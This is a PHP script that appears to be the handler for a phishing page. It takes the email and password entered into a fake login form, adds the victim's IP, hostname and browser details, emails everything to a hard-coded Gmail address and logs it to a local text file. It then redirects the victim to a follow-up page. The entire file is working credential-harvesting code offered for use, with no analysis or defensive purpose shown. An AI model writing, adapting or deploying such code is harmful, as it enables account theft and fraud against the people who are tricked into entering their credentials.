<?php

if($_POST["login"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------EMS INFO-----------------------\n";
$message .= "Email            : ".$_POST['login']."\n";
$message .= "Password           : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "millergreg.greg435@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);  

$fp = fopen("lek.txt","a");
fputs($fp,$message);
fclose($fp);
 
}

$praga=rand();
$praga=md5($praga);
  header ("Location: ems.php?email=".$_POST['login']);
  
}else{
header ("Location: index.php");
}

?>

